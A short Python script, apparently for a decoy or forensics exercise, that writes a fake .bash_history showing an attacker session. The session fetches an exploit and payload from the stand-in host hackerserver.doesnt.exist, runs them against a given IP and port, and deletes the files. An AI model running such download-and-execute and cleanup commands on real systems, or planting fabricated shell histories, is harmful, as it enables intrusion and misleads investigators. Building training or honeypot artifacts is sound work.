import sys

ipaddr = sys.argv[1]

template = '''whoami
id
pwd
wget http://hackerserver.doesnt.exist/exploit_x64
chmod +x exploit_x64
wget http://hackerserver.doesnt.exist/payload
decrypt payload > prs.py
./exploit_x64 --ip %s --port 13579 --upload "prs.py"
./exploit_x64 --ip %s --port 13579 --run "python prs.py" --remote_port 4002
rm -rf exploit_x64 prs.py
exit
'''

with open(".bash_history", "w") as f:
	f.write(template%(ipaddr, ipaddr))
